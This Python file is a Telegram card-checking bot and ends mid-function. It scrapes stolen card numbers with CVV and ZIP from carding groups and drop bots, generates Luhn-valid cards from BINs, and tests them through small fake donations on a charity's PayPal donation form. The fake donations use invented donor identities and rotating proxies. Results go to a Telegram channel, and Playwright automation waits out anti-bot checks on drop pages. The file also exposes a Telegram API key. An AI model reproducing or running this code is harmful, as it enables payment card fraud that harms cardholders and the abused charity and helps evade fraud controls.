#!/usr/bin/env python3
"""
Telegram Card Checker Bot – PayPal Only + BIN Lookup + ZIP Capture
- Monitors groups & xForce drops
- Extracts cards (CC|MM|YY|CVV + optional fields)
- Checks via PayPal (country‑aware addresses)
- Forwards result to OxyCondoneIt (includes ZIP if present)
- Commands: /gen, /bin, /chkpp, /drop, /status, /addchat, /removechat, /clearchat
"""

import re
import asyncio
import logging
import os
import random
import json
import aiohttp
import requests
import time
import hashlib
import subprocess
import sys
import glob
import urllib.parse
import threading
from datetime import datetime, timezone
from threading import Thread
from typing import Dict, Optional, List

# ======================================================================
# FORCE LD_LIBRARY_PATH (fixes libnspr4.so missing on Replit)
# ======================================================================
def set_nix_library_path():
    if not (os.environ.get("REPL_ID") or os.path.exists("/home/runner/.replit")):
        return
    keywords = [
        "nspr", "nss", "atk", "at-spi2", "gtk3", "alsa-lib", "dbus", "glib",
        "libx11", "libxcb", "libxkbcommon", "libxcomposite", "libxdamage",
        "libxext", "libxfixes", "libxrandr", "expat", "cups",
        "mesa", "cairo", "pango",
    ]
    paths = set()
    try:
        nix_entries = os.listdir("/nix/store")
    except Exception:
        return
    for entry in nix_entries:
        lower = entry.lower()
        if lower.endswith(".drv") or lower.endswith("-dev") or lower.endswith("-doc"):
            continue
        for kw in keywords:
            if f"-{kw}-" in lower or lower.endswith(f"-{kw}"):
                lib_dir = f"/nix/store/{entry}/lib"
                if os.path.isdir(lib_dir):
                    paths.add(lib_dir)
                break
    if paths:
        existing = os.environ.get("LD_LIBRARY_PATH", "")
        os.environ["LD_LIBRARY_PATH"] = ":".join(paths) + (":" + existing if existing else "")
        print("[FIX] LD_LIBRARY_PATH updated.", flush=True)

set_nix_library_path()

# ======================================================================
# Write replit.nix only if missing
# ======================================================================
def ensure_replit_nix():
    nix_path = "replit.nix"
    if os.path.exists(nix_path):
        with open(nix_path, "r") as f:
            if "playwright" in f.read():
                return False
    content = '''{ pkgs }: {
  deps = [
    pkgs.playwright
    pkgs.nss
    pkgs.nspr
    pkgs.atk
    pkgs.at-spi2-atk
    pkgs.cups
    pkgs.libdrm
    pkgs.libxkbcommon
    pkgs.mesa
    pkgs.xorg.libXcomposite
    pkgs.xorg.libXdamage
    pkgs.xorg.libXrandr
    pkgs.xorg.libXtst
    pkgs.xorg.libXScrnSaver
    pkgs.xorg.libX11
    pkgs.xorg.libxcb
    pkgs.gtk3
    pkgs.alsa-lib
    pkgs.dbus
    pkgs.expat
    pkgs.fontconfig
    pkgs.libXrender
    pkgs.libXfixes
    pkgs.libXcursor
    pkgs.libXi
    pkgs.pango
    pkgs.cairo
    pkgs.libGL
    pkgs.glib
    pkgs.libxshmfence
  ];
}
'''
    with open(nix_path, "w") as f:
        f.write(content)
    print("[PLAYWRIGHT] Created replit.nix. Please STOP and RUN your Repl again.", flush=True)
    return True

if ensure_replit_nix():
    sys.exit(0)

# ======================================================================
# Auto‑install Chromium
# ======================================================================
def ensure_chromium_installed():
    cache_dirs = [
        os.path.expanduser("~/.cache/ms-playwright"),
        os.path.join(os.getcwd(), ".cache", "ms-playwright"),
    ]
    def _find_binary():
        for cache_dir in cache_dirs:
            for name in ["chrome", "chrome-headless-shell"]:
                try:
                    result = subprocess.run(["find", cache_dir, "-name", name, "-type", "f"], capture_output=True, text=True, timeout=5)
                    if result.stdout.strip():
                        return True
                except:
                    pass
        return False
    if _find_binary():
        print("[PLAYWRIGHT] Chromium already installed.", flush=True)
        return True
    print("[PLAYWRIGHT] Installing Chromium (1-2 min)...", flush=True)
    try:
        subprocess.run([sys.executable, "-m", "playwright", "install", "chromium"], check=True, timeout=180)
        print("[PLAYWRIGHT] Chromium installation completed.", flush=True)
        for _ in range(10):
            time.sleep(1)
            if _find_binary():
                print("[PLAYWRIGHT] Chromium binary found.", flush=True)
                return True
    except Exception as e:
        print(f"[PLAYWRIGHT] Installation error: {e}", flush=True)
    return False

# ======================================================================
# Playwright setup
# ======================================================================
CHROMIUM_INSTALLED = False
PLAYWRIGHT_OK = False
PLAYWRIGHT_EXECUTABLE_PATH = None

def find_chromium_executable():
    try:
        best = None
        for entry in os.listdir("/nix/store"):
            lower = entry.lower()
            if lower.endswith(".drv") or "-dev" in lower or "-doc" in lower:
                continue
            if re.match(r'^[a-z0-9]+-chromium-\d', lower) and "sandbox" not in lower:
                for name in ["chromium", "chromium-browser"]:
                    candidate = f"/nix/store/{entry}/bin/{name}"
                    if os.path.isfile(candidate) and os.access(candidate, os.X_OK):
                        if best is None or entry > best[0]:
                            best = (entry, candidate)
        if best:
            print(f"[PLAYWRIGHT] Using Nix chromium: {best[1]}", flush=True)
            return best[1]
    except Exception:
        pass
    cache_dirs = [
        os.path.expanduser("~/.cache/ms-playwright"),
        os.path.join(os.getcwd(), ".cache", "ms-playwright"),
    ]
    for cache_dir in cache_dirs:
        for pattern in [
            os.path.join(cache_dir, "chromium-*/chrome-linux*/chrome"),
            os.path.join(cache_dir, "chromium_headless_shell-*/chrome-headless-shell-linux64/chrome-headless-shell"),
        ]:
            matches = glob.glob(pattern)
            if matches:
                return matches[0]
    return None

def create_wrapper_script(real_chrome_path):
    wrapper_dir = os.path.expanduser("~/playwright-wrapper")
    os.makedirs(wrapper_dir, exist_ok=True)
    wrapper_path = os.path.join(wrapper_dir, "chromium-wrapper.sh")
    ld_path = os.environ.get("LD_LIBRARY_PATH", "")
    content = f"""#!/bin/bash
export LD_LIBRARY_PATH="{ld_path}"
exec "{real_chrome_path}" "$@"
"""
    with open(wrapper_path, "w") as f:
        f.write(content)
    os.chmod(wrapper_path, 0o755)
    print(f"[PLAYWRIGHT] Wrapper created at {wrapper_path}", flush=True)
    return wrapper_path

def setup_playwright():
    global CHROMIUM_INSTALLED, PLAYWRIGHT_OK, PLAYWRIGHT_EXECUTABLE_PATH
    CHROMIUM_INSTALLED = ensure_chromium_installed()
    if not CHROMIUM_INSTALLED:
        print("[PLAYWRIGHT] Chromium not installed – Playwright disabled.", flush=True)
        return False
    chrome_path = find_chromium_executable()
    if not chrome_path:
        print("[PLAYWRIGHT] Chromium binary not found.", flush=True)
        return False
    print(f"[PLAYWRIGHT] Found Chromium at {chrome_path}", flush=True)
    is_nix = chrome_path.startswith("/nix/store/")
    executable = chrome_path if is_nix else create_wrapper_script(chrome_path)
    if not executable:
        return False
    if not is_nix:
        print(f"[PLAYWRIGHT] Wrapper created at {executable}", flush=True)
    PLAYWRIGHT_EXECUTABLE_PATH = executable
    from playwright.sync_api import sync_playwright
    saved_ldpath = os.environ.pop("LD_LIBRARY_PATH", None)
    try:
        for label, path in [("primary", executable), ("fallback", chrome_path)]:
            try:
                with sync_playwright() as p:
                    browser = p.chromium.launch(
                        headless=True,
                        executable_path=path,
                        args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"]
                    )
                    browser.close()
                print(f"[PLAYWRIGHT] Playwright working ({label})!", flush=True)
                PLAYWRIGHT_EXECUTABLE_PATH = path
                PLAYWRIGHT_OK = True
                return True
            except Exception as e:
                print(f"[PLAYWRIGHT] {label} failed: {str(e)[:120]}", flush=True)
    finally:
        if saved_ldpath is not None:
            os.environ["LD_LIBRARY_PATH"] = saved_ldpath
    return False

from playwright.async_api import async_playwright as _real_async_playwright

class async_playwright:
    async def __aenter__(self):
        if PLAYWRIGHT_OK:
            self._ctx = _real_async_playwright()
            return await self._ctx.__aenter__()
        return self
    async def __aexit__(self, *args):
        if PLAYWRIGHT_OK and hasattr(self, "_ctx"):
            await self._ctx.__aexit__(*args)
    def chromium(self):
        class Dummy:
            async def launch(self, **kwargs):
                raise RuntimeError("Playwright unavailable")
        return Dummy()

# ======================================================================
# Proxy Manager (for PayPal only)
# ======================================================================
class ProxyManager:
    _proxies: List[str] = []
    _index = 0
    _last_fetch = 0
    _fetch_interval = 300
    _lock = threading.Lock()

    @classmethod
    def _init_lock(cls):
        if cls._lock is None:
            import threading
            cls._lock = threading.Lock()

    @classmethod
    def _test_proxy(cls, proxy_url: str, timeout: int = 8) -> bool:
        try:
            r = requests.get("https://api.stripe.com/v1", proxies={"https": proxy_url}, timeout=timeout)
            return r.status_code in (200, 401)
        except Exception:
            return False

    @classmethod
    def fetch(cls) -> List[str]:
        cls._init_lock()
        with cls._lock:
            now = time.time()
            if now - cls._last_fetch < cls._fetch_interval and cls._proxies:
                return cls._proxies
            sources = [
                "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&timeout=8000",
                "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            ]
            raw = []
            for url in sources:
                try:
                    r = requests.get(url, timeout=15)
                    raw += [l.strip() for l in r.text.strip().splitlines() if l.strip() and ":" in l]
                except Exception:
                    continue
            seen = set()
            candidates = []
            for p in raw:
                if "//" not in p:
                    p = "http://" + p
                if p not in seen:
                    seen.add(p)
                    candidates.append(p)
            tested = []
            for p in candidates[:40]:
                if cls._test_proxy(p):
                    tested.append(p)
            cls._proxies = tested
            cls._last_fetch = now
            cls._index = 0
            print(f"[ProxyManager] {len(tested)} working proxies", flush=True)
            return tested

    @classmethod
    def get(cls) -> Optional[str]:
        cls._init_lock()
        with cls._lock:
            if not cls._proxies:
                return None
            proxy = cls._proxies[cls._index % len(cls._proxies)]
            cls._index += 1
            return proxy

    @classmethod
    def remove(cls, proxy_url: str):
        cls._init_lock()
        with cls._lock:
            if proxy_url in cls._proxies:
                cls._proxies.remove(proxy_url)

# ======================================================================
# Flask web server
# ======================================================================
from flask import Flask, jsonify
flask_app = Flask(__name__)
BOT_USERNAME = "Oxy"
PORT = int(os.environ.get("PORT", 8080))
RUN_MODE = os.environ.get("RUN_MODE", "both").lower()

@flask_app.route('/')
def home():
    return jsonify({"status": "alive", "bot": BOT_USERNAME, "playwright_ok": PLAYWRIGHT_OK})
@flask_app.route('/health')
def health():
    return jsonify({"status": "healthy"})
def run_flask():
    flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)

logging.basicConfig(filename="scraper.log", level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger()

# ======================================================================
# Telegram configuration
# ======================================================================
API_ID = 37079398  # REPLACE WITH YOUR API ID
API_HASH = "678f499b4345b640ba83ed7b1fc1efc0"  # REPLACE
SESSION_NAME = "mysession"
WATCHED_CHATS_FILE = "watched_chats.json"

DEFAULT_SOURCE_CHATS = [
    "https://t.me/+01N1N0nFYEA4MWRl",
    "newscrapper4",
    "cc_checker_Stuff",
    "xForceDropsBot",
    "X-Force Group",
]

def _load_watched_chats():
    if os.path.exists(WATCHED_CHATS_FILE):
        try:
            with open(WATCHED_CHATS_FILE, "r") as f:
                return json.load(f)
        except Exception:
            pass
    return list(DEFAULT_SOURCE_CHATS)

def _save_watched_chats(chats):
    try:
        with open(WATCHED_CHATS_FILE, "w") as f:
            json.dump(chats, f)
    except Exception:
        pass

SOURCE_CHATS_RAW = _load_watched_chats()
XFORCE_BOT_USERNAME = "xForceDropsBot"
FORWARD_TARGET = "OxyCondoneIt"

from telethon import TelegramClient, events
from telethon.errors import UserAlreadyParticipantError
from telethon.tl.functions.messages import ImportChatInviteRequest, CheckChatInviteRequest, RequestAppWebViewRequest
from telethon.tl.types import InputBotAppShortName

client = TelegramClient(SESSION_NAME, API_ID, API_HASH)

# ======================================================================
# ENHANCED Card extraction (supports CC|MM|YY|CVV + optional fields, captures ZIP)
# ======================================================================
def extract_card_from_text(text: str):
    """
    Extracts card in format: CC|MM|YY|CVV (and optional extra fields like name|address|zip)
    Returns tuple: (card, mm, yy, cvv, zip_or_none)
    """
    # Match pattern with up to 6 pipe-separated parts
    # CC (15-16 digits), MM (1-2 digits), YY (2-4 digits), CVV (3-4 digits), then optional fields
    pattern = re.compile(
        r'(\d{15,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})(?:\|([^\|]*?))?(?:\|([^\|]*?))?(?:\|(\d{5})(?:\||$))?'
    )
    match = pattern.search(text)
    if match:
        card = match.group(1)
        mm = match.group(2)
        yy = match.group(3)
        cvv = match.group(4)
        # Look for 5-digit zip in any of the remaining groups (5,6,7)
        zip_code = None
        for i in range(5, 8):
            part = match.group(i)
            if part and re.match(r'^\d{5}$', part):
                zip_code = part
                break
        if len(yy) == 2:
            yy = f"20{yy}"
        return (card, mm, yy, cvv, zip_code)

    # Fallback: simple pattern without extra fields
    simple = re.search(r'(\d{15,16})\s*[|\/]\s*(\d{1,2})\s*[|\/]\s*(\d{2,4})\s*[|\/]\s*(\d{3,4})', text)
    if simple:
        card, mm, yy, cvv = simple.groups()
        if len(yy) == 2:
            yy = f"20{yy}"
        return (card, mm, yy, cvv, None)

    # Fallback without CVV
    fallback = re.search(r'(\d{15,16})\s*[|\/]\s*(\d{1,2})\s*[|\/]\s*(\d{2,4})', text)
    if fallback:
        card, mm, yy = fallback.groups()
        if len(yy) == 2:
            yy = f"20{yy}"
        return (card, mm, yy, "000", None)
    return None

# ======================================================================
# BIN lookup (binlist.net)
# ======================================================================
async def get_bin_info(bin6: str) -> dict:
    url = f"https://lookup.binlist.net/{bin6}"
    headers = {"Accept-Version": "3"}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers, timeout=10) as resp:
                if resp.status == 200:
                    data = await resp.json(content_type=None)
                    return {
                        "bank": data.get("bank", {}).get("name", "Unknown Bank"),
                        "brand": data.get("scheme", "UNKNOWN").upper(),
                        "type": data.get("type", "UNKNOWN").upper(),
                        "country": data.get("country", {}).get("name", "Unknown"),
                        "country_code": data.get("country", {}).get("alpha2", "XX"),
                        "prepaid": data.get("prepaid", False),
                        "level": data.get("brand", "STANDARD").upper(),
                    }
    except:
        pass
    return None

# ======================================================================
# Card generation
# ======================================================================
def luhn_sum(card: str) -> int:
    total = 0
    for i, ch in enumerate(card[::-1]):
        n = int(ch)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total

def generate_card_number(bin_prefix: str) -> str:
    bin_prefix = bin_prefix[:6]
    is_amex = bin_prefix[:2] in ("34", "37")
    length = 15 if is_amex else 16
    fill_len = length - len(bin_prefix) - 1
    body = bin_prefix + "".join(str(random.randint(0,9)) for _ in range(fill_len))
    for check in range(10):
        candidate = body + str(check)
        if luhn_sum(candidate) % 10 == 0:
            return candidate
    return body + "0"

def generate_expiry():
    return f"{random.randint(1,12):02d}", str(random.randint(2025,2032))

def generate_cvv(card: str) -> str:
    return str(random.randint(1000,9999)) if card[:2] in ("34","37") else str(random.randint(100,999))

def generate_card_with_bin(bin_prefix: str) -> str:
    card = generate_card_number(bin_prefix)
    mm, yy = generate_expiry()
    cvv = generate_cvv(card)
    return f"{card}|{mm}|{yy}|{cvv}"

# ======================================================================
# PayPal Charger (country‑aware addresses, fixed order creation)
# ======================================================================
FORM_VIEW_URL = "https://binnaclehouse.org/?givewp-route=donation-form-view&form-id=3945"
AJAX_URL = "https://binnaclehouse.org/wp-admin/admin-ajax.php"
FORM_ID = "3945"
_BASE_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}

class PayPalCharger:
    def __init__(self, proxy=None, bin_country=None):
        self.session = requests.Session()
        self.session.headers.update(_BASE_HEADERS)
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
        self._proxy = proxy
        self._bin_country = bin_country

    # Country‑aware address generator (IT, GB, CA, AU, US)
    def _random_address(self, country_code: str) -> Dict[str, str]:
        first_names = ["James","John","Robert","Michael","William","David","Richard","Joseph","Thomas","Charles",
                       "Mary","Patricia","Jennifer","Linda","Elizabeth","Barbara","Susan","Jessica","Sarah","Karen"]
        last_names = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez",
                      "Hernandez","Lopez","Gonzalez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Martin"]
        first = random.choice(first_names)
        last = random.choice(last_names)
        domains = ["gmail.com","yahoo.com","outlook.com","hotmail.com","icloud.com","protonmail.com"]
        email = f"{first.lower()}.{last.lower()}{random.randint(10,999)}@{random.choice(domains)}"
        phone_prefix = random.choice(["06","02","081","011","091","010","051","055","041","045"])
        phone = f"{phone_prefix}{random.randint(1000000,9999999)}"

        if country_code == "IT":
            cities = ["Rome","Milan","Naples","Turin","Palermo","Genoa","Bologna","Florence","Venice","Verona"]
            provinces = ["RM","MI","NA","TO","PA","GE","BO","FI","VE","VR"]
            postals = ["00118","20121","80121","10121","90121","16121","40121","50121","30121","37121"]
            street_names = ["Via Roma","Corso Vittorio","Via Garibaldi","Via Manzoni","Via Dante","Via Cavour","Via Mazzini","Via XX Settembre","Via Nazionale","Via Tuscolana"]
            index = random.randint(0, len(cities)-1)
            city = cities[index]
            state = provinces[index]
            postal = postals[index]
            street = f"{random.randint(1, 200)} {random.choice(street_names)}"
            country = "IT"
        elif country_code == "GB":
            cities = ["London","Birmingham","Manchester","Glasgow","Liverpool","Bristol","Sheffield","Leeds","Edinburgh","Leicester"]
            provinces = ["LND","WMD","MAN","GLG","LIV","BST","SHF","LDS","EDI","LCE"]
            postals = ["EC1A","B1","M1","G1","L1","BS1","S1","LS1","EH1","LE1"]
            street_names = ["High Street","King Street","Queen Street","Church Road","Station Road","Main Street","Park Lane","Victoria Street","London Road","Oxford Street"]
            index = random.randint(0, len(cities)-1)
            city = cities[index]
            state = provinces[index]
            postal = postals[index] + str(random.randint(1,9))
            street = f"{random.randint(1, 200)} {random.choice(street_names)}"
            country = "GB"
        elif country_code == "CA":
            cities = ["Toronto","Vancouver","Montreal","Calgary","Edmonton","Ottawa","Winnipeg","Quebec City","Hamilton","Halifax"]
            provinces = ["ON","BC","QC","AB","MB","ON","QC","NS","ON","NS"]
            postals = ["M5V2T6","V6B4Y8","H2X3Y4","T2P1J9","T5J2N9","K1P5E8","R3B0Y6","G1R4S9","L8P1A2","B3J2K9"]
            street_names = ["Maple","Oak","Pine","Cedar","Birch","Elm","Walnut","Chestnut","Spruce","Willow"]
            street_suffix = ["Ave","St","Rd","Cres","Blvd","Dr","Ln","Ct","Way","Place"]
            index = random.randint(0, len(cities)-1)
            city = cities[index]
            state = provinces[index]
            postal = postals[index]
            street = f"{random.randint(1, 200)} {random.choice(street_names)} {random.choice(street_suffix)}"
            country = "CA"
        elif country_code == "AU":
            cities = ["Sydney","Melbourne","Brisbane","Perth","Adelaide","Gold Coast","Canberra","Newcastle","Wollongong","Hobart"]
            provinces = ["NSW","VIC","QLD","WA","SA","QLD","ACT","NSW","NSW","TAS"]
            postals = ["2000","3000","4000","6000","5000","4217","2600","2300","2500","7000"]
            street_names = ["George","Pitt","King","Queen","Elizabeth","William","Albert","Victoria","Oxford","Hyde"]
            index = random.randint(0, len(cities)-1)
            city = cities[index]
            state = provinces[index]
            postal = postals[index]
            street = f"{random.randint(1, 200)} {random.choice(street_names)} St"
            country = "AU"
        else:  # default US
            cities = ["Springfield","Columbus","Charlotte","Phoenix","Austin","Denver","Nashville","Portland","Louisville","Memphis",
                      "Seattle","Las Vegas","Minneapolis","San Antonio","Jacksonville","Indianapolis","Fort Worth","San Jose","El Paso","Baltimore"]
            states = ["AL","AK","AZ","AR","CA","CO","CT","DE","FL","GA","HI","ID","IL","IN","IA","KS","KY","LA","ME","MD",
                      "MA","MI","MN","MS","MO","MT","NE","NV","NH","NJ","NM","NY","NC","ND","OH","OK","OR","PA","RI","SC",
                      "SD","TN","TX","UT","VT","VA","WA","WV","WI","WY"]
            street_names = ["Maple","Oak","Pine","Cedar","Birch","Elm","Walnut","Chestnut","Spruce","Willow",
                            "Park","Lake","Hill","Main","Broadway","Lincoln","Washington","Franklin","Adams","Jefferson"]
            street_suffixes = ["St","Ave","Rd","Dr","Ln","Ct","Blvd","Way","Place","Circle"]
            index = random.randint(0, len(cities)-1)
            city = cities[index]
            state = random.choice(states)
            postal = f"{random.randint(10000, 99950):05d}"
            street = f"{random.randint(100, 9999)} {random.choice(street_names)} {random.choice(street_suffixes)}"
            country = "US"
            phone = f"{random.choice(['206','312','404','512','614','702','803','904','214','303'])}{random.randint(1000000,9999999)}"

        return {
            "first_name": first,
            "last_name": last,
            "email": email,
            "line1": street,
            "city": city,
            "state": state,
            "postal": postal,
            "phone": phone,
            "country": country,
        }

    def _random_donor(self, country_code: str = "US") -> Dict[str, str]:
        return self._random_address(country_code)

    def _random_amount(self) -> float:
        return round(random.uniform(0.50, 2.00), 2)

    def _get_form_data(self, retries=3):
        for attempt in range(retries):
            try:
                self.session.get("https://binnaclehouse.org/donation/", timeout=15)
                r = self.session.get(FORM_VIEW_URL, timeout=20)
                r.raise_for_status()
                m = re.search(r"window\.givewpDonationFormExports\s*=\s*(\{.*?\});\s*[\n\r]", r.text, re.S)
                if not m:
                    raise RuntimeError("givewpDonationFormExports block not found")
                blob = m.group(1)
                def _extract(key):
                    match = re.search(rf'"{key}"\s*:\s*"([^"]+)"', blob)
                    return match.group(1).replace("\\/", "/") if match else ""
                nonce = _extract("donationFormNonce")
                client_id = _extract("clientId")
                if not nonce or not client_id:
                    raise RuntimeError("Missing nonce or clientId")
                return {"nonce": nonce, "client_id": client_id}
            except Exception as e:
                if attempt == retries-1:
                    raise
                time.sleep(2)
                self.session = requests.Session()
                self.session.headers.update(_BASE_HEADERS)
                if self._proxy:
                    self.session.proxies = {"http": self._proxy, "https": self._proxy}

    def _create_order(self, nonce, amount, retries=3):
        for attempt in range(retries):
            try:
                resp = self.session.post(
                    AJAX_URL,
                    params={"action": "give_paypal_commerce_create_order"},
                    data={
                        "give-honeypot": "",
                        "give-form-id": FORM_ID,
                        "give-form-hash": nonce,
                        "give-form-id-prefix": f"give-{FORM_ID}-0",
                        "give-amount": f"{amount:.2f}",
                        "give-gateway": "paypal-commerce",
                        "payment-mode": "paypal-commerce",
                    },
                    headers={"X-Requested-With": "XMLHttpRequest"},
                    timeout=30,
                )
                res = resp.json()
                if res.get("success") and "data" in res and "id" in res["data"]:
                    return res["data"]["id"]
                else:
                    raise RuntimeError(f"Order creation failed: {resp.text[:200]}")
            except Exception as e:
                if attempt == retries-1:
                    raise
                time.sleep(2)
                self.session = requests.Session()
                self.session.headers.update(_BASE_HEADERS)
                if self._proxy:
                    self.session.proxies = {"http": self._proxy, "https": self._proxy}

    def _submit_payment(self, order_id, n, mm, yy, cvc, donor):
        ua = self.session.headers["User-Agent"]
        headers = {
            "Host": "www.paypal.com",
            "Paypal-Client-Context": order_id,
            "X-App-Name": "standardcardfields",
            "Paypal-Client-Metadata-Id": order_id,
            "User-Agent": ua,
            "Content-Type": "application/json",
            "Accept": "*/*",
            "Origin": "https://www.paypal.com",
            "Referer": f"https://www.paypal.com/smart/card-fields?token={order_id}",
        }
        query = """
        mutation payWithCard($token: String! $card: CardInput $phoneNumber: String $firstName: String $lastName: String
            $shippingAddress: AddressInput $billingAddress: AddressInput $email: String $currencyConversionType: CheckoutCurrencyConversionType) {
            approveGuestPaymentWithCreditCard(token: $token card: $card phoneNumber: $phoneNumber firstName: $firstName
                lastName: $lastName email: $email shippingAddress: $shippingAddress billingAddress: $billingAddress
                currencyConversionType: $currencyConversionType) { flags { is3DSecureRequired } cart { cartId } } }
        """
        address = {
            "givenName": donor["first_name"],
            "familyName": donor["last_name"],
            "line1": donor["line1"],
            "line2": None,
            "city": donor["city"],
            "state": donor["state"],
            "postalCode": donor["postal"],
            "country": donor["country"],
        }
        card_type = self._detect_card_type(n)
        full_year = yy if len(yy) == 4 else f"20{yy}"
        phone = donor["phone"]
        variables = {
            "token": order_id,
            "card": {
                "cardNumber": n,
                "type": card_type,
                "expirationDate": f"{mm}/{full_year}",
                "postalCode": donor["postal"],
                "securityCode": cvc,
            },
            "phoneNumber": phone,
            "firstName": donor["first_name"],
            "lastName": donor["last_name"],
            "email": donor["email"],
            "billingAddress": address,
            "shippingAddress": address,
            "currencyConversionType": "PAYPAL",
        }
        # Pre‑visit to set cookies
        try:
            self.session.get(f"https://www.paypal.com/smart/card-fields?token={order_id}&env=production",
                             headers={"Referer": "https://binnaclehouse.org/donation/", "Accept": "text/html"}, timeout=15)
        except:
            pass
        for use_proxy in [True, False]:
            if not use_proxy and self._proxy:
                self.session.proxies = None
            for attempt in range(3):
                try:
                    resp = self.session.post(
                        "https://www.paypal.com/graphql?approveGuestPaymentWithCreditCard",
                        headers=headers,
                        json={"query": query, "variables": variables},
                        timeout=60,
                    )
                    if resp.status_code == 429:
                        time.sleep(int(resp.headers.get("Retry-After", 10)))
                        continue
                    if resp.status_code == 200:
                        try:
                            res = resp.json()
                            if "errors" in res:
                                err_msg = res["errors"][0].get("message", "Unknown")
                                code = res["errors"][0].get("data", [{}])[0].get("code", "")
                                full = f"{err_msg} ({code})" if code else err_msg
                                soft_hits = ["INSUFFICIENT_FUNDS", "CARD_AUTHORIZATION", "3D_SECURE",
                                             "DO_NOT_HONOR", "TRANSACTION_REFUSED"]
                                if any(k in full.upper() for k in soft_hits):
                                    return f"APPROVED|{full}"
                                else:
                                    return f"DECLINED|{full}"
                            if res.get("data", {}).get("approveGuestPaymentWithCreditCard"):
                                return "CHARGED|Payment successful"
                            return f"UNKNOWN|{resp.text[:150]}"
                        except Exception as e:
                            return f"PARSE_ERROR|{e}"
                    else:
                        continue
                except requests.exceptions.ProxyError:
                    break
                except Exception as e:
                    if attempt == 2:
                        return f"ERROR|{e}"
                    time.sleep(2)
        return "DECLINED|No response after all retries"

    @staticmethod
    def _detect_card_type(n: str) -> str:
        n = n.replace(" ", "").replace("-", "")
        if n.startswith("4"): return "VISA"
        if re.match(r"^5[1-5]|^2[2-7]", n): return "MASTER_CARD"
        if n.startswith(("34", "37")): return "AMEX"
        if n.startswith(("6011", "65")) or re.match(r"^64[4-9]", n): return "DISCOVER"
        return "VISA"

    def charge(self, cc: str) -> str:
        parts = cc.strip().split("|")
        if len(parts) < 4:
            return "ERROR|Invalid format"
        n, mm, yy, cvc = parts[:4]
        if len(yy) == 4:
            yy = yy[2:]
        # Get BIN country hint
        bin6 = n[:6]
        country_code = "US"
        try:
            loop = asyncio.new_event_loop()
            bin_info = loop.run_until_complete(get_bin_info(bin6))
            loop.close()
            if bin_info:
                cc_code = bin_info.get("country_code")
                if cc_code in ("IT", "GB", "CA", "AU", "US"):
                    country_code = cc_code
        except:
            pass
        donor = self._random_donor(country_code)
        amount = self._random_amount()
        logger.info(f"[PayPal] Checking {n[:4]}...{n[-4:]} with donor {donor['first_name']} {donor['last_name']} ({donor['email']}), amount=${amount:.2f}, country={country_code}")
        try:
            form_data = self._get_form_data()
            order_id = self._create_order(form_data["nonce"], amount)
            result = self._submit_payment(order_id, n, mm, yy, cvc, donor)
            logger.info(f"[PayPal] Result: {result[:80]}")
            return result
        except Exception as e:
            logger.error(f"[PayPal] ERROR: {e}")
            return f"ERROR|{e}"

# ======================================================================
# xForce automation – uses copy button with security check wait
# ======================================================================
DEDUP_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "xforce_dedup.json")

def xlog(tag, msg):
    ts = datetime.now(timezone.utc).strftime("%H:%M:%S")
    print(f"[{ts}] [{tag}] {msg}", flush=True)
    logger.info(msg)

class XForceAutomator:
    def __init__(self, bot_client, target_group):
        self.bot_client = bot_client
        self.target_group = target_group
        self.processed_links = set()
        self.processed_cards = set()
        self._drop_queue = asyncio.Queue()
        self._worker_task = None
        self._load_state()

    def _log(self, tag, msg):
        xlog(tag, msg)

    def _load_state(self):
        try:
            with open(DEDUP_FILE, "r") as f:
                data = json.load(f)
            self.processed_links = set(data.get("links", []))
            self.processed_cards = set(data.get("cards", []))
        except:
            pass

    def _save_state(self):
        try:
            with open(DEDUP_FILE, "w") as f:
                json.dump({"links": list(self.processed_links), "cards": list(self.processed_cards)}, f)
        except:
            pass

    async def _get_drop_url(self, event):
        msg = event.message
        if not msg.reply_markup:
            return None
        for row in msg.reply_markup.rows:
            for btn in row.buttons:
                if hasattr(btn, 'text') and "View Drop" in btn.text:
                    if hasattr(btn, 'url') and btn.url:
                        return btn.url
        return None

    async def _wait_for_security_check(self, page):
        try:
            await page.wait_for_function(
                'document.body.innerText.includes("Analyzing security")',
                timeout=15000
            )
            self._log("browser", "Security check detected, waiting for completion...")
            await page.wait_for_function(
                '!document.body.innerText.includes("Analyzing security")',
                timeout=30000
            )
            self._log("browser", "Security check completed")
            await asyncio.sleep(3)
            return True
        except Exception as e:
            self._log("browser", f"Security check wait error: {e}")
            return False

    async def _wait_for_copy_button(self, page, timeout=30000):
        """Prioritise button[class*='copy']"""
        selectors = [
            'button[class*="copy"]',          # <-- explicit selector from logs
            'button[aria-label="Copy"]',
            'button[title*="Copy"]',
            'svg[data-icon="copy"]',
            'i[class*="copy"]',
            '.copy-btn',
            'button:has-text("Copy")',
            '[role="button"][aria-label*="copy"]',
        ]
        start = time.time()
        while time.time() - start < timeout / 1000:
            for sel in selectors:
                try:
                    btn = await page.query_selector(sel)
                    if btn and await btn.is_visible() and await btn.is_enabled():
                        self._log("browser", f"Copy button found: {sel}")
                        return btn
                except:
                    continue
            await asyncio.sleep(1)
        return None

    async def _click_copy_button(self, page):
        btn = await self._wait_for_copy_button(page)
        if btn:
            await btn.click()
            await asyncio.sleep(2)
            return True
        return False

    async def _get_clipboard(self, page):
        for attempt in range(5):
            try:
                clipboard = await page.evaluate("""
                    async () => {
                        try {
                            const text = await navigator.clipboard.readText();
                            return text;
                        } catch(e) {
                            return '';
                        }
                    }
                """)
                if clipboard and len(clipboard) > 10:
                    return clipboard
            except:
                pass
            await asyncio.sleep(1)
        return ""

    async def _click_open_drop(self, page):
        try:
            btn = await page.wait_for_selector('button:has-text("Open Drop")', timeout=30000)
            if btn:
                await btn.click()
